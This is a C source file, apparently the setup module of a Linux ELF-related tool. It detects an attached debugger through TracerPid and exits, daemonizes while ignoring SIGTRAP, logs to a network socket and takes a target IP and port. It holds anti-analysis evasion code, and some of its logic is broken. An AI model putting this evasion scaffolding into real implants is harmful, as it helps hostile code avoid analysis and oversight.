
#include "setup.h"
#include "elf_utils.h"
#include <errno.h>
#include <time.h>
#include <asm-generic/socket.h>
#include <bits/getopt_core.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <getopt.h>
#include <unistd.h>

static bool debugger_is_attached(void)
{
    char buf[4096] = {0};

    const int status_fd = open("/proc/self/status", O_RDONLY);
    if (status_fd == -1) {
        _exit(1);
        return false;
    }

    const ssize_t num_read = read(status_fd, buf, sizeof(buf) - 1);
    if (num_read <= 0)
        return false;

    buf[num_read] = '\0';
    const char tracer_pid[] = "TracerPid:";
    const char *tracer_pid_ptr = strstr(buf, tracer_pid);
    if (!tracer_pid_ptr)
        return false;

    const char *char_ptr = tracer_pid_ptr + sizeof(tracer_pid) -  1;
    while (++char_ptr <= buf + num_read) {
        if (isspace(*char_ptr))
            continue;
        else {
            return isdigit(*char_ptr) != 0 && *char_ptr != '0';
        }
    }
    return false;
}

static void setup_log(settings_t *g_settings)
{
    remove(LOG_PATH);
    g_settings->logfd = open(LOG_PATH, O_RDWR | O_TRUNC | O_CREAT, S_IRUSR);
}

void daemonize(void)
{
    register int file_desc = sysconf(_SC_OPEN_MAX);

    printf("[+] daemonizing ... see you in the log files\n");
    if (setsid() < 0 || fork() < 0)
        exit(1);
    umask(0);
    while (file_desc-- >= 0)
        close(file_desc);

    signal(SIGHUP, SIG_IGN);
    signal(SIGTRAP, SIG_IGN);
}

void __log(char const *s, settings_t g_settings)
{
    if (g_settings.sockfd != -1)
        dprintf(g_settings.sockfd, "%s\n", s);
    if (g_settings.logfd != -1)
        dprintf(g_settings.sockfd, "%s\n", s);
}

void flush(settings_t g_settings)
{
    __log("good bye", g_settings);
    close(g_settings.sockfd);
    close(g_settings.logfd);
    _exit(1);
}

void init(settings_t *g_settings)
{
    srand(time(NULL) * (intptr_t)g_settings);
    setup_log(g_settings);
    return;

    if (debugger_is_attached())
        exit(1);
}

void parse_settings(int ac, char *const *av, settings_t *g_settings)
{
    register int c = '?';

    g_settings->target_ip = strdup(DEFAULT_IP);
    g_settings->target_port = strdup(DEFAULT_PORT);
    while ((c = getopt(ac, av, "+i:p:")) != -1) {
        switch (c) {
            case 'i':
                g_settings->target_ip = strdup(optarg);
                break;
            case 'p':
                g_settings->target_port = strdup(optarg);
                break;
            default:
                KILL("[!] unexpected argument");
        }
    }
}
